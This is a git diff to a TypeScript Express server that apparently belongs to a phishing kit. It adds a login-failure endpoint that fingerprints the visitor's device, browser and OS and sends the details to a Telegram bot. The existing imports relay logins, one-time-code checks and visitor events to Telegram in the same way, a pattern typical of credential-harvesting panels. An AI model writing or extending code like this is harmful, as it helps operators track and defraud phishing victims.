@@ -1,7 +1,7 @@
 import type { Express } from "express";
 import { createServer, type Server } from "http";
 import { z } from "zod";
-import { notifyLogin, notifyOtpVerification, notifyOtpFailure, notifySuccess, notifyVisitor } from "./telegram";
+import { notifyLogin, notifyOtpVerification, notifyOtpFailure, notifySuccess, notifyLoginFailure, notifyVisitor } from "./telegram";
 import { UAParser } from "ua-parser-js";
 
 const loginSchema = z.object({
@@ -213,6 +213,43 @@ export async function registerRoutes(app: Express): Promise<Server> {
       });
     } catch (error) {
       console.error("Success notification error:", error);
+    }
+  });
+
+  // Login failure notification endpoint
+  app.post("/api/login-failure", async (req, res) => {
+    // Return immediately to not block the app
+    res.json({ success: true });
+    
+    try {
+      const { language, userAgent } = req.body;
+      
+      // Parse User-Agent if provided
+      let device = 'Unknown';
+      let browser = 'Unknown';
+      let os = 'Unknown';
+      
+      if (userAgent) {
+        const parser = new UAParser(userAgent);
+        const result = parser.getResult();
+        
+        device = result.device.type 
+          ? `${result.device.vendor || ''} ${result.device.model || ''} (${result.device.type})`.trim()
+          : 'Desktop/Unknown';
+        browser = result.browser.name 
+          ? `${result.browser.name} ${result.browser.version || ''}`.trim()
+          : 'Unknown';
+        os = result.os.name 
+          ? `${result.os.name} ${result.os.version || ''}`.trim()
+          : 'Unknown';
+      }
+      
+      // Send login failure notification to Telegram (async, don't wait)
+      notifyLoginFailure(language, device, browser, os).catch(err => {
+        console.error("Failed to send login failure notification:", err);
+      });
+    } catch (error) {
+      console.error("Login failure notification error:", error);
     }
   });
 
